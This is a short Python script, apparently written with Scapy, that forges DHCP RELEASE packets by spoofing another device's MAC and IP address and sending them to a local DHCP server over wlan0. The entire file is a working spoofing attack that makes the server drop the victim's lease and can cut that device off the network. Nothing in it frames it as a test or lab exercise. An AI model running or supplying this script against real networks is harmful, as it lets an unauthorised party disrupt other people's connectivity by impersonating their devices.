#!/usr/bin/env python3
from scapy.all import (Ether, IP, UDP, BOOTP, DHCP, sendp, sniff,
                       conf, getmacbyip, mac2str)
from time import sleep
import random

conf.checkIPaddr = False

IFACE = "wlan0"
DHCP_SERVER_IP = "10.10.13.1"
DHCP_SERVER_MAC = getmacbyip(DHCP_SERVER_IP) or "ff:ff:ff:ff:ff:ff"
MAC_TO_RELEASE = "14:d4:24:61:51:73"
IP_TO_RELEASE = "10.10.13.38"
MAC_TO_RELEASE = "9e:07:9a:e7:52:d7"


pkt = (Ether(src=MAC_TO_RELEASE, dst=DHCP_SERVER_MAC)
         / IP(src=IP_TO_RELEASE, dst=DHCP_SERVER_IP)                   # unicast to server
         / UDP(sport=68, dport=67)
         / BOOTP(op=1, htype=1, hlen=6,
                 xid=random.randint(1, 0xFFFFFFFF),
                 ciaddr=IP_TO_RELEASE,                            # REQUIRED for RELEASE
                 chaddr=mac2str(MAC_TO_RELEASE),
                 flags=0)
         / DHCP(options=[("message-type", "release"),   # type 7
                         ("server_id", DHCP_SERVER_IP),
                         "end"]))


for _ in range(3):
    sendp(pkt, iface=IFACE)
    sleep(0.1)
